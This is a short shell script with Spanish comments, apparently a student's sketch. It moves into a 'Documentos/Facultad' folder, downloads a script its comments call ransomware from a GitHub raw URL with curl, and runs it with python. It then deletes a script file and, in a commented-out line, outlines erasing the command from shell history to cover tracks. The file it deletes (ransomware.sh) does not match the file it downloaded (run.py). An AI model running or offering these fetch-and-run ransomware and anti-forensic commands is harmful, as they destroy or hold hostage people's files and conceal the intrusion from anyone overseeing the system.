# Mover a Directorio Objetivo
cd Documentos/Facultad

# Descargar script de ransomware
curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/feat/ransomware/run.py

# Ejecutar script de ransomware
python run.py

# Eliminar archivo de ransomware?
# ?

# Eliminar archivo de script
cd ../..
rm ransomware.sh

# Eliminar ejecución de script del historial de comandos?
# history -d (history | tail -n 2 | head -n 1 | awk '{print $1}')
